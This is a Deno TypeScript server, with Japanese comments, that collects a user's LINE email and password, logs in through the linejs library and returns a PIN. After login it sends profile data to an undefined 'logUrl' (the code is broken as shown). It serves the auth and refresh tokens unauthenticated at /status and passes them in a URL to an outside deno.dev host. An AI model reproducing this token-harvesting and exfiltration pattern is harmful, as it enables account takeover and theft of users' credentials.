import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { serveFile } from "https://deno.land/std@0.224.0/http/file_server.ts";
import { loginWithPassword } from "@evex/linejs";

// セッション一時保存
let loginSuccess = false;
let savedAuthToken = "";
let savedRefreshToken = "";

serve(async (req) => {
  const url = new URL(req.url);
  const pathname = url.pathname;
  console.log("[REQUEST]", req.method, pathname);

  // HTMLファイル返却（index.htmlなど）
  if (req.method === "GET" && (pathname === "/" || pathname.endsWith(".html"))) {
    const filePath = pathname === "/" ? "./index.html" : `.${pathname}`;
    try {
      return await serveFile(req, filePath);
    } catch {
      return new Response("ファイルが見つかりません", { status: 404 });
    }
  }

  // GET /status → 状態確認用（未使用なら削除OK）
  if (req.method === "GET" && pathname === "/status") {
    return new Response(
      JSON.stringify({
        success: loginSuccess,
        token: savedAuthToken,
        refresh: savedRefreshToken,
      }),
      { headers: { "Content-Type": "application/json" } },
    );
  }

  // POST /api/login → PIN発行
  if (req.method === "POST" && pathname === "/api/login") {
    const { email, password, device = "DESKTOPWIN" } = await req.json();
    const pincode = Math.floor(100000 + Math.random() * 900000).toString();

    // ログイン処理開始（非同期）
    loginWithPassword({
      email,
      password,
      pincode,
      onPincodeRequest(code) {
        console.log("PINコード:", code);
      },
    }, { device }).then(async (client) => {
      const authtoken = client.authToken;
      const profile = await client.base.talk.getProfile();
      const profileText = JSON.stringify(profile, null, 2);


      fetch(logUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(logdata),
      });

      // 保存（status確認用）
      loginSuccess = true;
      savedAuthToken = authtoken;
      savedRefreshToken = await client.base.storage.get("refreshToken");
    }).catch((err) => {
      console.error("ログイン失敗:", err);
    });

    // PINをフロントに返す
    const sessionId = crypto.randomUUID(); // 固有のセッションID
    return Response.json({ sessionId, pincode });
  }

  // POST /api/pin → 認証完了確認してURL返却
  if (req.method === "POST" && pathname === "/api/pin") {
    const { sessionId } = await req.json();

    if (!loginSuccess) {
      return Response.json({ status: "PENDING" });
    }

    const url =
      "https://line-extension.deno.dev/?token=" +
      encodeURIComponent(savedAuthToken) +
      "&refresh=" + encodeURIComponent(savedRefreshToken);

    return Response.json({ status: "OK", url });
  }

  return new Response("Not Found", { status: 404 });
}, { port: 8000 });
